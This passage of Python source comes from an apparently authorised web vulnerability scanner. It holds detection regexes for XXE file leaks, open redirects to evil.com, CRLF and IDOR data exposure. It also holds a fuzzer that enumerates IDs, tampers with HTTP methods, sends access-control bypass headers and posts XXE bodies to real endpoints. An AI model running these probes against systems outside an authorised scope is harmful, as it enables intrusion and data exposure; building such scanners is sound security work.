            "Open redirect — meta refresh to evil.com in response body"),
        (r"<meta[^>]*http-equiv\s*=\s*['\"]?refresh[^>]*url\s*=\s*['\"]?https?://[^'\">\s]*[^a-z]evil",
            "Open redirect — meta refresh to external domain"),
        (r"window\.location\s*[=]\s*['\"][^'\"]*evil\.com",
            "Open redirect — JavaScript window.location set to evil.com"),
        (r"document\.location\s*[=]\s*['\"][^'\"]*evil\.com",
            "Open redirect — JavaScript document.location set to evil.com"),
        (r"window\.location\.href\s*=\s*['\"][^'\"]*evil\.com",
            "Open redirect — JS location.href assigned to evil.com"),
        (r"window\.location\.replace\s*\(['\"][^'\"]*evil\.com",
            "Open redirect — JS location.replace to evil.com"),
        (r"window\.location\.assign\s*\(['\"][^'\"]*evil\.com",
            "Open redirect — JS location.assign to evil.com"),
        (r"<a\s[^>]*href\s*=\s*['\"]javascript:",
            "Open redirect — javascript: URI in anchor href"),
        (r"<a\s[^>]*href\s*=\s*['\"]data:text/html",
            "Open redirect — data: URI in anchor href"),
        (r"window\.open\s*\(['\"][^'\"]*evil\.com",
            "Open redirect — window.open to evil.com"),
        (r"location\s*=\s*['\"]//evil\.com",
            "Open redirect — protocol-relative redirect in JS"),
        (r"0;\s*url\s*=\s*https?://evil\.com",
            "Open redirect — meta refresh value reflected in body"),
    ],
    "xxe": [
        # ── Linux file content ───────────────────────────────────────────
        (r"root:x:0:0:",                        "XXE CONFIRMED — /etc/passwd readable via XML"),
        (r"daemon:x:",                          "XXE confirmed — system file readable"),
        (r"Linux version \d+\.\d+",             "XXE confirmed — /proc/version leaked"),
        (r"HOME=/",                             "XXE confirmed — /proc/self/environ leaked"),
        # ── Windows file content ─────────────────────────────────────────
        (r"\[fonts\]",                          "XXE CONFIRMED — win.ini readable via XML"),
        (r"\[boot loader\]",                    "XXE confirmed — boot.ini readable"),
        (r"# Copyright.*Microsoft",             "XXE confirmed — Windows hosts file readable"),
        # ── Cloud metadata ───────────────────────────────────────────────
        (r"ami-id",                             "XXE+SSRF confirmed — AWS metadata via XXE"),
        (r"computeMetadata",                    "XXE+SSRF confirmed — GCP metadata via XXE"),
        (r"instance-id",                        "XXE+SSRF confirmed — cloud metadata via XXE"),
        # ── PHP base64 exfil ─────────────────────────────────────────────
        (r"^[A-Za-z0-9+/]{40,}={0,2}$",        "XXE likely — base64-encoded file via php://filter"),
        # ── Billion laughs / entity expansion ────────────────────────────
        (r"lollollollollol",                    "XXE DoS — entity expansion (billion laughs) worked"),
        (r"aaaaaaaaaa",                         "XXE DoS — recursive entity expansion confirmed"),
        # ── Java XML parser errors ───────────────────────────────────────
        (r"org\.xml\.sax\.SAXParseException",   "XXE error — Java SAX parser"),
        (r"javax\.xml\.parsers",                "XXE error — Java XML parser"),
        (r"com\.sun\.org\.apache\.xerces",      "XXE error — Xerces parser (Java)"),
        (r"org\.apache\.xerces",                "XXE error — Apache Xerces parser"),
        (r"java\.io\.FileNotFoundException",    "XXE error — Java file access attempted"),
        (r"TransformerException",               "XXE error — Java XSLT transformer"),
        # ── PHP XML parser errors ────────────────────────────────────────
        (r"simplexml_load_string",              "XXE error — PHP SimpleXML parser"),
        (r"DOMDocument::loadXML",               "XXE error — PHP DOMDocument parser"),
        (r"XMLReader::open",                    "XXE error — PHP XMLReader parser"),
        (r"parser error.*SYSTEM.*ENTITY",       "XXE error — libxml2 entity error"),
        (r"warning.*failed to load external entity", "XXE error — libxml2 entity load failed"),
        # ── .NET XML parser errors ───────────────────────────────────────
        (r"System\.Xml\.XmlException",          "XXE error — .NET XmlReader parser"),
        (r"System\.Xml\.XmlDocument",           "XXE error — .NET XmlDocument parser"),
        (r"DTD is prohibited",                  "XXE blocked — .NET DTD processing disabled"),
        # ── Python XML parser errors ─────────────────────────────────────
        (r"xml\.etree\.ElementTree",            "XXE error — Python ElementTree parser"),
        (r"lxml\.etree",                        "XXE error — Python lxml parser"),
        (r"ExpatError",                         "XXE error — Python Expat parser"),
        # ── Ruby XML parser errors ───────────────────────────────────────
        (r"Nokogiri::XML",                      "XXE error — Ruby Nokogiri parser"),
        (r"REXML::ParseException",              "XXE error — Ruby REXML parser"),
        # ── Node.js / generic ────────────────────────────────────────────
        (r"xmldom.*parse",                      "XXE error — Node.js xmldom parser"),
        (r"SyntaxError.*XML",                   "XXE error — XML syntax error exposed"),
        (r"ENTITY.*not defined",                "XXE error — undefined entity reference"),
    ],
    "header_injection": [
        (r"X-Injected: header", "Header injection confirmed — injected header reflected"),
        (r"Set-Cookie: evil=1", "CRLF injection confirmed — cookie injected"),
        (r"Location: https?://evil\.com", "Response splitting — Location header injected"),
        (r"<html>split</html>", "HTTP response splitting — second response body injected"),
        (r"X-Forwarded-For: 127\.0\.0\.1", "Header injection — X-Forwarded-For injected"),
        (r"Host: evil\.com", "Header injection — Host header injected"),
        (r"X-XSS-Protection:\s*0", "CRLF injection — XSS protection header disabled"),
        (r"Access-Control-Allow-Origin:\s*\*", "CRLF injection — permissive CORS header injected"),
        (r"PWNED", "CRLF body injection confirmed — arbitrary body content injected"),
        (r"Transfer-Encoding:\s*chunked", "CRLF injection — Transfer-Encoding header injected"),
    ],
    "crlf_injection": [
        (r"Set-Cookie:", "CRLF injection — cookie header injected via line break"),
        (r"Injected: header", "CRLF injection — custom header injected"),
        (r"Content-Type: text/html", "CRLF injection — Content-Type overridden"),
        (r"HTTP/1\.[01] 200", "Response splitting — second HTTP response injected"),
        (r"<script>alert\(1\)</script>", "CRLF injection — XSS via body injection"),
    ],
    "prototype_pollution": [
        (r'"isAdmin"\s*:\s*true',          "Prototype pollution confirmed — injected isAdmin property reflected"),
        (r'"polluted"\s*:\s*"yes"',        "Prototype pollution confirmed — injected polluted property reflected"),
        (r"Error: Cannot set property",    "Prototype pollution caused server-side TypeError"),
        (r"Cannot set properties of",      "Prototype pollution — read-only property violation"),
        (r"__proto__",                     "Prototype chain reference reflected in response"),
    ],
    "exceptional_conditions": [
        (r"Traceback \(most recent call",  "Exceptional condition triggered — Python traceback (A10:2025)"),
        (r"Fatal error:",                  "Exceptional condition triggered — PHP fatal error"),
        (r"NullPointerException",          "Exceptional condition triggered — Java NPE"),
        (r"TypeError|ValueError|RangeError", "Exceptional condition triggered — JS/Node.js type error"),
        (r"undefined is not",              "Type confusion — JavaScript undefined error leaked"),
        (r"\bNaN\b",                       "Exceptional condition — NaN value reflected in response"),
        (r"Internal Server Error",         "Unhandled exceptional condition — 500 error on edge input"),
    ],
    # ── Buffer Overflow / Memory Corruption detectors ───────────────────
    "buffer_overflow": [
        # Segfault / crash signals
        (r"Segmentation fault",           "Buffer overflow — segmentation fault triggered"),
        (r"SIGSEGV",                      "Buffer overflow — SIGSEGV signal caught"),
        (r"SIGBUS",                       "Buffer overflow — bus error signal"),
        (r"SIGABRT",                      "Buffer overflow — abort signal (heap corruption)"),
        (r"stack smashing detected",      "Buffer overflow — stack canary tripped"),
        (r"stack buffer overflow",        "Buffer overflow — stack buffer overflow detected"),
        (r"heap-buffer-overflow",         "Buffer overflow — heap buffer overflow (ASan)"),
        (r"AddressSanitizer",             "Buffer overflow — AddressSanitizer detected corruption"),
        (r"buffer overflow",              "Buffer overflow — explicit overflow message"),
        # Access violation / memory errors
        (r"Access violation",             "Buffer overflow — access violation (Windows)"),
        (r"STATUS_STACK_BUFFER_OVERRUN",  "Buffer overflow — Windows stack buffer overrun"),
        (r"munmap_chunk.*invalid",        "Buffer overflow — glibc heap corruption"),
        (r"double free or corruption",    "Buffer overflow — double free detected"),
        (r"malloc.*assertion.*failed",    "Buffer overflow — malloc assertion failed"),
        # Format string indicators
        (r"(?:0x)?[0-9a-f]{8}(?:\.[0-9a-f]{8}){3,}", "Format string — stack data leaked via %x"),
        (r"%[0-9]*\$[xsnp]",             "Format string — format specifier reflected (not executed)"),
        # Generic crash / timeout
        (r"core dumped",                  "Buffer overflow — core dump produced"),
        (r"out of memory",               "Buffer overflow — memory exhaustion via large input"),
        (r"MemoryError",                  "Buffer overflow — Python MemoryError from large input"),
        (r"java\.lang\.OutOfMemoryError", "Buffer overflow — Java OutOfMemoryError"),
        (r"RecursionError|Maximum call stack", "Stack overflow — recursion limit from deep nesting"),
    ],
    # ── XPath Injection detectors ───────────────────────────────────────
    "xpath_injection": [
        # XPath error messages (prove injection reached parser)
        (r"XPathException",               "XPath injection — XPathException exposed"),
        (r"Invalid XPath expression",     "XPath injection — invalid expression error"),
        (r"xmlXPathEval.*error",          "XPath injection — libxml2 XPath evaluation error"),
        (r"XPathEvalError",               "XPath injection — XPath evaluation error"),
        (r"javax\.xml\.xpath",            "XPath injection — Java XPath parser error"),
        (r"XPathSyntaxError",             "XPath injection — Python lxml XPath syntax error"),
        (r"Unregistered function",        "XPath injection — unregistered XPath function"),
        (r"Expected node test",           "XPath injection — unexpected node test error"),
        (r"XMLXPathError",               "XPath injection — XPath error in response"),
        # Boolean extraction indicators
        (r"(?:true|false)\s*$",           "XPath injection — boolean result leaked (blind extraction)"),
        # Authentication bypass indicators
        (r"admin|root|superuser",         "XPath injection — privileged data in response"),
        # Node/document structure leak
        (r"<[a-zA-Z]+>.*</[a-zA-Z]+>",   "XPath injection — XML node structure leaked"),
    ],

    # ── IDOR / Broken Access Control detectors ───────────────────────────
    "idor": [
        # ── PII exposure (suggests data from another user) ───────────────
        (r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
            "IDOR likely — email address exposed on ID-swapped request"),
        (r"\b\d{3}-\d{2}-\d{4}\b",
            "IDOR CRITICAL — SSN-like pattern in response on ID swap"),
        (r"\b\d{13,19}\b",
            "IDOR likely — possible credit card number in response"),
        (r"\"(password|passwd|secret|token|api_key|apikey)\"",
            "IDOR — sensitive field name in response body"),
        # ── User data structure patterns ─────────────────────────────────
        (r"\"(user_id|userId|account_id|accountId)\":\s*\d+",
            "IDOR likely — user/account ID field in response"),
        (r"\"(username|user_name|first_name|last_name|full_name)\":\s*\"",
            "IDOR likely — user profile data in response"),
        (r"\"(address|phone|mobile|ssn|dob|date_of_birth)\"",
            "IDOR — personal data field exposed on ID swap"),
        # ── Admin/privileged content indicators ──────────────────────────
        (r"\"(role|is_admin|isAdmin|admin|privilege|permission)\"",
            "IDOR — role/privilege field exposed"),
        (r"\"(internal|private|confidential|restricted)\"",
            "IDOR — access to restricted/internal content"),
        # ── ACL bypass indicators ────────────────────────────────────────
        (r"Spring Boot Actuator",
            "ACL bypass — Spring Boot Actuator endpoint accessible"),
        (r"Swagger|swagger-ui|openapi",
            "ACL bypass — API documentation endpoint accessible"),
        (r"phpMyAdmin|phpmyadmin",
            "ACL bypass — phpMyAdmin accessible without auth"),
        (r"graphiql|GraphQL Playground",
            "ACL bypass — GraphQL IDE accessible"),
        (r"\"(env|environment)\".*\"(production|staging|development)\"",
            "ACL bypass — environment config exposed"),
    ],

    # ── ACL bypass (checked via header-injection method) ─────────────────
    "acl_bypass": [],  # Detection is status-code based in _fuzz_idor, not pattern-based

    # ── CSRF bypass (detection is response-comparison based) ───────────────
    "csrf": [
        # Success indicators: form accepted without proper CSRF protection
        (r"(?i)(?:success|updated|saved|created|submitted|deleted|changed|modified)",
            "CSRF bypass — action success message without valid token"),
        (r"(?i)(?:thank\s+you|operation\s+completed|request\s+(?:processed|accepted))",
            "CSRF bypass — confirmation message without valid token"),
        (r"(?i)(?:logged\s+out|password\s+changed|profile\s+updated|settings\s+saved)",
            "CSRF bypass — sensitive action completed without CSRF token"),
        # Rejection indicators (these mean the server IS protected)
        (r"(?i)(?:invalid\s+(?:csrf|token|authenticity)|csrf\s+(?:token\s+)?(?:invalid|expired|missing|mismatch))",
            "CSRF_PROTECTED — server rejected invalid token"),
        (r"(?i)(?:forbidden|access\s+denied|request\s+rejected|security\s+violation)",
            "CSRF_PROTECTED — server rejected request"),
    ],

    # ── HTTP Request Smuggling ─────────────────────────────────────────────
    "http_smuggling": [
        # Server error indicators suggesting desync confusion
        (r"(?i)bad\s+request", "Smuggling — server returned Bad Request (possible desync)"),
        (r"(?i)invalid\s+(?:chunk|transfer|content[\s-]length)",
            "Smuggling — server rejected malformed CL/TE (processing confusion)"),
        (r"(?i)(?:400|501)\s+(?:bad|not\s+implemented)",
            "Smuggling — error status in response body"),
        (r"(?i)chunked\s+(?:encoding|transfer)\s+(?:error|not\s+supported|invalid)",
            "Smuggling — chunked encoding handling error"),
        (r"(?i)content[\s-]length\s+mismatch",
            "Smuggling — CL mismatch detected by server"),
        (r"(?i)request\s+(?:timeout|timed?\s*out)",
            "Smuggling — request timeout (possible hung parser)"),
        (r"(?i)(?:proxy|gateway)\s+(?:error|timeout|502|504)",
            "Smuggling — proxy/gateway error (frontend/backend desync)"),
        (r"(?i)transfer[\s-]encoding.*(?:not\s+supported|invalid|rejected)",
            "Smuggling — TE header rejected"),
        (r"(?i)(?:unexpected|premature)\s+(?:end|eof|close|disconnect)",
            "Smuggling — unexpected connection close (desync indicator)"),
        (r"(?i)(?:duplicate|conflicting)\s+(?:header|content[\s-]length|transfer[\s-]encoding)",
            "Smuggling — server detected duplicate/conflicting headers"),
        (r"(?i)http\s+version\s+not\s+supported",
            "Smuggling — HTTP version confusion"),
        (r"(?i)(?:connection|socket)\s+(?:reset|closed|refused|broken)",
            "Smuggling — connection disruption (possible desync side effect)"),
    ],
}


@dataclass
class FuzzResult:
    url:           str
    method:        str
    param:         str
    param_type:    str
    payload:       str
    vuln_type:     str
    finding:       str
    severity:      str
    evidence_id:   Optional[str] = None
    resp_time_ms:  float = 0.0
    status_code:   int = 0


class Fuzzer:
    """
    Active payload fuzzer. Takes input surfaces from Crawler.SiteMap
    and sends real attack payloads against each discovered parameter.
    """

    SEV_MAP = {
        "sqli_error":       "high",
        "sqli_bool_true":   "high",
        "sqli_bool_false":  "high",
        "sqli_blind_time":  "high",
        "xss_reflected":    "high",
        "xss_stored":       "high",
        "lfi":              "critical",
        "cmdi":             "critical",
        "ssti":             "high",
        "ssrf":             "critical",
        "open_redirect":    "medium",
        "xxe":              "critical",
        "header_injection":      "medium",
        "crlf_injection":        "medium",
        "prototype_pollution":   "high",
        "exceptional_conditions": "medium",
        "idor":                  "high",
        "acl_bypass":            "high",
        "method_tamper":         "medium",
        "http_smuggling":        "high",
        "csrf":                  "high",
        "buffer_overflow":       "high",
        "xpath_injection":       "high",
    }

    # Which vuln types to run per param type
    PARAM_TYPE_MAP: dict[str, list[str]] = {
        "query":  ["sqli_error", "sqli_bool_true", "sqli_blind_time", "xss_reflected", "lfi",
                   "cmdi", "ssti", "ssrf", "open_redirect", "idor", "xpath_injection",
                   "buffer_overflow"],
        "form":   ["sqli_error", "sqli_bool_true", "sqli_blind_time", "xss_reflected", "xss_stored",
                   "lfi", "cmdi", "ssti", "xxe", "open_redirect", "xpath_injection",
                   "buffer_overflow"],
        "header": ["header_injection", "crlf_injection", "sqli_error", "buffer_overflow"],
        "path":   ["sqli_error", "sqli_bool_true", "lfi", "idor", "buffer_overflow"],
        "json":   ["sqli_error", "sqli_bool_true", "xss_reflected", "xss_stored", "ssti", "xxe",
                   "xpath_injection"],
        "cookie": ["sqli_error", "sqli_bool_true", "xss_reflected", "buffer_overflow"],
    }

    def __init__(
        self,
        scope: ScopeManager,
        session: requests.Session,
        ev_store: EvidenceStore | None = None,
        timeout:       int = 10,
        time_threshold: float = 2.5,   # seconds delta for time-based detection
        max_surfaces:  int = 500,
        rate_limit:    float = 0.05,   # min seconds between requests
        on_finding: Callable | None = None,
        stop_event: threading.Event | None = None,
        oast: "OASTServer | None" = None,
    ):
        self.scope          = scope
        self.session        = session
        self.ev_store       = ev_store or _global_store
        self.timeout        = timeout
        self.time_threshold = time_threshold
        self.max_surfaces   = max_surfaces
        self.rate_limit     = rate_limit
        self.on_finding     = on_finding
        self.stop_event     = stop_event or threading.Event()
        self.results:       list[FuzzResult] = []
        self._lock          = threading.Lock()
        self.oast           = oast
        self._oast_tokens:  dict[str, dict] = {}  # token → {vuln_type, surface, payload}

    def fuzz_all(self, surfaces: list) -> list[FuzzResult]:
        """
        Fuzz all input surfaces. Returns list of confirmed findings.
        Runs in parallel threads up to 5 concurrent.
        After in-band fuzzing, polls OAST for out-of-band callbacks.
        """
        from concurrent.futures import ThreadPoolExecutor, as_completed

        limited = surfaces[:self.max_surfaces]
        with ThreadPoolExecutor(max_workers=5) as pool:
            futures = {pool.submit(self._fuzz_surface, s): s for s in limited}
            for fut in as_completed(futures):
                if self.stop_event.is_set():
                    break
                try:
                    fut.result()
                except Exception:
                    pass

        # ── HTTP Request Smuggling — per-URL, not per-param ─────────────
        smuggling_urls = list({s.url for s in limited})[:10]  # max 10 URLs
        for url in smuggling_urls:
            if self.stop_event.is_set():
                break
            self._fuzz_http_smuggling(url)

        # ── CSRF bypass testing — per-form, not per-param ─────────────────
        self._fuzz_csrf(limited)

        # ── Collect OAST out-of-band findings ────────────────────────────
        if self.oast and self._oast_tokens:
            self._collect_oast_findings()

        return self.results

    # Minimum content-length difference ratio for boolean blind detection
    BOOL_BLIND_THRESHOLD = 0.15  # 15% difference in response size

    def _fuzz_surface(self, surface):
        vuln_types = self.PARAM_TYPE_MAP.get(surface.param_type, ["sqli_error", "xss_reflected"])

        for vuln_type in vuln_types:
            if self.stop_event.is_set():
                return

            # ── IDOR — ID enumeration + method tampering + ACL bypass ──
            if vuln_type == "idor":
                self._fuzz_idor(surface)
                continue

            # ── XXE — raw XML body injection, needs dedicated method ──
            if vuln_type == "xxe":
                if surface.method in ("POST", "PUT", "PATCH"):
                    self._fuzz_xxe(surface)
                continue

            # ── Stored XSS — inject canary, re-fetch to verify persistence ──
            if vuln_type == "xss_stored":
                self._fuzz_stored_xss(surface)
                continue

            # ── Boolean-based blind SQLi — paired differential analysis ──
            if vuln_type == "sqli_bool_true":
                self._fuzz_boolean_blind(surface)
                continue

            # Skip sqli_bool_false — handled inside _fuzz_boolean_blind
            if vuln_type == "sqli_bool_false":
                continue

            payloads = PAYLOADS.get(vuln_type, [])
            if not payloads:
                continue

            # For time-based, need baseline first
            baseline_time = None
            if vuln_type == "sqli_blind_time":
                baseline_time = self._baseline(surface)

            for payload in payloads[:8]:   # max 8 payloads per vuln type per surface
                if self.stop_event.is_set():
                    return
                time.sleep(self.rate_limit)
                self._send_payload(surface, vuln_type, payload, baseline_time)

        # ── OAST out-of-band payloads for blind vulnerabilities ──────────
        if self.oast and self.oast.started:
            self._inject_oast_payloads(surface)

    def _fuzz_boolean_blind(self, surface):
        """
        Boolean-based blind SQLi: send paired true/false payloads and compare
        response length & content. If true-condition response differs significantly
        from false-condition response, injection is likely.
        """
        true_payloads  = PAYLOADS.get("sqli_bool_true", [])
        false_payloads = PAYLOADS.get("sqli_bool_false", [])
        if not true_payloads or not false_payloads:
            return

        # Get baseline response (original value) for comparison
        baseline_resp = self._send_and_capture(surface, "BASELINE_VALUE")
        if baseline_resp is None:
            return
        baseline_len = len(baseline_resp.text)

        for i, (tp, fp) in enumerate(zip(true_payloads[:6], false_payloads[:6])):
            if self.stop_event.is_set():
                return
            time.sleep(self.rate_limit)

            true_resp = self._send_and_capture(surface, tp)
            if true_resp is None:
                continue
            time.sleep(self.rate_limit)

            false_resp = self._send_and_capture(surface, fp)
            if false_resp is None:
                continue

            true_len  = len(true_resp.text)
            false_len = len(false_resp.text)

            # Detection: true response similar to baseline, false response different
            # OR: true and false responses differ significantly from each other
            max_len = max(true_len, false_len, 1)
            diff_ratio = abs(true_len - false_len) / max_len

            if diff_ratio >= self.BOOL_BLIND_THRESHOLD:
                # Confirm: true response should be closer to baseline than false
                true_delta  = abs(true_len - baseline_len)
                false_delta = abs(false_len - baseline_len)

                if true_delta < false_delta or diff_ratio >= 0.3:
                    finding_text = (
                        f"Boolean-based blind SQLi — differential response detected "
                        f"(true={true_len}B, false={false_len}B, delta={diff_ratio:.0%}) "
                        f"[{surface.param}: true={tp[:40]}, false={fp[:40]}]"
                    )
                    url = self._build_url(surface, tp)
                    headers = self._build_headers(surface, tp)
                    body = self._build_body(surface, tp)
                    eid = self._store_evidence(surface, "sqli_bool_true", tp, url,
                                               headers, body or "", true_resp,
                                               0.0)
                    self._record_finding(surface, "sqli_bool_true", tp, finding_text,
                                         "high", url, dict(true_resp.headers),
                                         str(headers), true_resp.text,
                                         0.0, true_resp.status_code, eid)
                    return  # one boolean blind finding per surface is enough

    # ── Stored XSS canary patterns for verifying unescaped persistence ────
    _STORED_XSS_CONFIRM_PATTERNS = [
        re.compile(r"<script[^>]*>alert\(['\"]?{CANARY}['\"]?\)</script>", re.I),
        re.compile(r"onerror\s*=\s*alert\(['\"]?{CANARY}['\"]?\)", re.I),
        re.compile(r"onload\s*=\s*alert\(['\"]?{CANARY}['\"]?\)", re.I),
        re.compile(r"ontoggle\s*=\s*alert\(['\"]?{CANARY}['\"]?\)", re.I),
        re.compile(r"onfocus\s*=\s*alert\(['\"]?{CANARY}['\"]?\)", re.I),
        re.compile(r"javascript:\s*alert\(['\"]?{CANARY}['\"]?\)", re.I),
        re.compile(r"<iframe[^>]*srcdoc\s*=", re.I),
        re.compile(r"onmouseover\s*=\s*alert\(['\"]?{CANARY}['\"]?\)", re.I),
    ]

    # Param names that suggest object/resource IDs (IDOR candidates)
    _IDOR_PARAM_PATTERNS = re.compile(
        r"(?i)(^id$|_id$|Id$|^uid$|^pid$|^fid$|^nid$|"
        r"user.?id|account.?id|order.?id|item.?id|product.?id|"
        r"customer.?id|invoice.?id|doc.?id|file.?id|record.?id|"
        r"profile.?id|session.?id|project.?id|ticket.?id|"
        r"^no$|^num$|^number$|^index$|^idx$|^key$|^ref$)"
    )

    def _fuzz_idor(self, surface):
        """
        IDOR / Broken Access Control testing:
        1) ID enumeration: swap ID-like params with adjacent/test values, compare responses
        2) HTTP method tampering: try PUT/DELETE/PATCH on discovered endpoints
        3) ACL bypass headers: X-Original-URL, X-Rewrite-URL path override
        """
        # ── 1) ID enumeration (only on ID-like params) ──────────────────
        if self._IDOR_PARAM_PATTERNS.search(surface.param):
            self._idor_enumerate(surface)

        # ── 2) HTTP method tampering (one attempt per surface) ──────────
        self._idor_method_tamper(surface)

        # ── 3) ACL bypass headers ───────────────────────────────────────
        self._idor_acl_bypass(surface)

    def _idor_enumerate(self, surface):
        """Try adjacent/test IDs on ID-like params, compare to baseline."""
        original = surface.original_value.strip()

        # Build test IDs
        test_ids = []
        if original.isdigit():
            orig_int = int(original)
            test_ids = [
                str(orig_int + 1),
                str(orig_int - 1) if orig_int > 0 else "0",
                "0",
                "1" if original != "1" else "2",
                "9999",
                str(orig_int + 100),
            ]
        else:
            # Non-numeric — use static fallbacks
            test_ids = ["1", "2", "0", "admin", "test",
                        "00000000-0000-0000-0000-000000000000"]

        # Get baseline response with original value
        baseline_resp = self._send_and_capture(surface, original)
        if not baseline_resp:
            return
        baseline_len = len(baseline_resp.text)
        baseline_status = baseline_resp.status_code

        # If baseline is already 401/403/404, skip — can't determine IDOR
        if baseline_status in (401, 403, 404):
            return

        for test_id in test_ids[:5]:  # cap at 5 attempts
            if self.stop_event.is_set():
                return
            time.sleep(self.rate_limit)

            resp = self._send_and_capture(surface, test_id)
            if not resp:
                continue

            # Flag conditions:
            # - Same status (200) but DIFFERENT content = enumerable resource
            # - 200 when we expected same content = data from different object
            if resp.status_code == 200 and baseline_status == 200:
                len_diff = abs(len(resp.text) - baseline_len)
                # Content must be meaningfully different (not just timestamps)
                if len_diff > 50 and len_diff / max(baseline_len, 1) > 0.1:
                    # Check for PII/sensitive data patterns in swapped response
                    resp_text = resp.text[:4000]
                    for pattern, desc in DETECTORS.get("idor", []):
                        if re.search(pattern, resp_text, re.I):
                            finding_text = (
                                f"{desc} [{surface.url} | {surface.param}="
                                f"{test_id} (original={original})]"
                            )
                            eid = self._store_evidence(
                                surface, "idor", test_id, surface.url,
                                {}, "", resp, 0,
                            )
                            self._record_finding(
                                surface, "idor", test_id, finding_text,
                                "high", surface.url, dict(resp.headers),
                                "", resp_text, 0, resp.status_code, eid,
                            )
                            return  # one finding per surface

    def _idor_method_tamper(self, surface):
        """Try unexpected HTTP methods to detect missing method-level access control."""
        # Only test on non-mutation surfaces (GET endpoints)
        if surface.method != "GET":
            return

        tamper_methods = ["PUT", "DELETE", "PATCH"]
        headers = {"User-Agent": "Mozilla/5.0 (compatible; DAST-Scanner/1.0)",
                    "Content-Type": "application/json"}

        for method in tamper_methods:
            if self.stop_event.is_set():
                return
            time.sleep(self.rate_limit)

            try:
                resp = self.session.request(
                    method, surface.url,
                    data='{"test": "idor"}',
                    headers=headers,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=False,
                )
                # Flag if server accepts the method (not 405 Method Not Allowed,
                # not 501 Not Implemented, not 404, not 401/403)
                if resp.status_code not in (401, 403, 404, 405, 501):
                    finding_text = (
                        f"HTTP method tampering — {method} accepted on GET endpoint "
                        f"(status {resp.status_code}) [{surface.url}]"
                    )
                    eid = self._store_evidence(
                        surface, "method_tamper", method, surface.url,
                        headers, '{"test": "idor"}', resp, 0,
                    )
                    self._record_finding(
                        surface, "method_tamper", method, finding_text,
                        "medium", surface.url, dict(resp.headers),
                        str(headers), resp.text[:2000], 0,
                        resp.status_code, eid,
                    )
                    return  # one method finding per surface
            except Exception:
                continue

    def _idor_acl_bypass(self, surface):
        """Test path-override headers to bypass access control."""
        bypass_headers = [
            ("X-Original-URL", "/admin"),
            ("X-Rewrite-URL", "/admin"),
            ("X-Original-URL", "/api/admin"),
            ("X-Rewrite-URL", "/api/users"),
            ("X-Custom-IP-Authorization", "127.0.0.1"),
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
        ]

        # First get baseline (no bypass headers)
        try:
            baseline = self.session.get(
                surface.url, timeout=self.timeout,
                verify=False, allow_redirects=False,
            )
        except Exception:
            return

        for header_name, header_value in bypass_headers[:4]:  # cap at 4
            if self.stop_event.is_set():
                return
            time.sleep(self.rate_limit)

            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (compatible; DAST-Scanner/1.0)",
                    header_name: header_value,
                }
                resp = self.session.get(
                    surface.url, headers=headers,
                    timeout=self.timeout, verify=False,
                    allow_redirects=False,
                )
                # If baseline was 403/401 but bypass gets 200 = confirmed
                if baseline.status_code in (401, 403) and resp.status_code == 200:
                    finding_text = (
                        f"ACL bypass CONFIRMED — {header_name}: {header_value} "
                        f"changed {baseline.status_code} to 200 [{surface.url}]"
                    )
                    eid = self._store_evidence(
                        surface, "acl_bypass", f"{header_name}: {header_value}",
                        surface.url, headers, "", resp, 0,
                    )
                    self._record_finding(
                        surface, "acl_bypass",
                        f"{header_name}: {header_value}", finding_text,
                        "high", surface.url, dict(resp.headers),
                        str(headers), resp.text[:2000], 0,
                        resp.status_code, eid,
                    )
                    return

                # If response is drastically different (different content, bigger)
                if (resp.status_code == 200 and baseline.status_code == 200
                        and abs(len(resp.text) - len(baseline.text)) > 200):
                    # Check for admin/sensitive content patterns
                    for pattern, desc in DETECTORS.get("idor", []):
                        if re.search(pattern, resp.text[:4000], re.I):
                            finding_text = (
                                f"ACL bypass likely — {header_name}: {header_value} "
                                f"exposes different content [{surface.url}]"
                            )
                            eid = self._store_evidence(
                                surface, "acl_bypass",
                                f"{header_name}: {header_value}",
                                surface.url, headers, "", resp, 0,
                            )
                            self._record_finding(
                                surface, "acl_bypass",
                                f"{header_name}: {header_value}",
                                finding_text, "high", surface.url,
                                dict(resp.headers), str(headers),
                                resp.text[:2000], 0, resp.status_code, eid,
                            )
                            return
            except Exception:
                continue

    def _fuzz_xxe(self, surface):
        """
        Send XXE payloads as raw XML body to POST/PUT/PATCH endpoints.
        Tries both application/xml and text/xml Content-Types.
        Detects via response pattern matching.
        """
        payloads = PAYLOADS.get("xxe", [])
        if not payloads:
            return

        content_types = ["application/xml", "text/xml"]

        for payload in payloads[:12]:  # cap at 12 payloads per surface
            if self.stop_event.is_set():
                return
            time.sleep(self.rate_limit)

            for ct in content_types:
                if self.stop_event.is_set():
                    return
                try:
                    headers = {
                        "User-Agent": "Mozilla/5.0 (compatible; DAST-Scanner/1.0)",
                        "Content-Type": ct,
                    }
                    t0 = time.time()
                    resp = self.session.request(
                        surface.method,
                        surface.url,
                        data=payload.encode("utf-8", errors="replace"),
                        headers=headers,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=False,
                    )
                    elapsed = (time.time() - t0) * 1000

                    resp_text = ""
                    try:
                        resp_text = resp.text
                    except Exception:
                        pass

                    # Pattern-based detection
                    for pattern, desc in DETECTORS.get("xxe", []):
                        if re.search(pattern, resp_text, re.I | re.S):
                            finding_text = (
                                f"{desc} [{surface.url} | Content-Type={ct} "
                                f"| payload={payload[:80]}]"
                            )
                            eid = self._store_evidence(
                                surface, "xxe", payload, surface.url,
                                headers, payload, resp, elapsed,
                            )
                            self._record_finding(
                                surface, "xxe", payload, finding_text,
                                self.SEV_MAP.get("xxe", "critical"),
                                surface.url, dict(resp.headers),
                                str(headers), resp_text, elapsed,
                                resp.status_code, eid,
                            )
                            return  # found XXE — stop this surface

                except requests.exceptions.Timeout:
                    continue
                except Exception:
                    continue

    # ── HTTP Request Smuggling ─────────────────────────────────────────────

    def _fuzz_http_smuggling(self, url: str):
        """
        HTTP Request Smuggling detection — sends CL.TE, TE.CL, TE.TE, CL.CL
        probes using both requests library (for simple probes) and raw sockets
        (for probes requiring duplicate/malformed headers).

        Detection methods:
        1. Status code anomaly (400, 500, 501, 505 on desync-inducing payloads)
        2. Timing differential (timeout on one variant but not another)
        3. Response body error patterns matching DETECTORS["http_smuggling"]
        4. Connection reset / unexpected close

        All probes are safe detection-only — no actual request poisoning.
        """
        import socket
        import ssl

        parsed = urlparse(url)
        host = parsed.hostname or ""
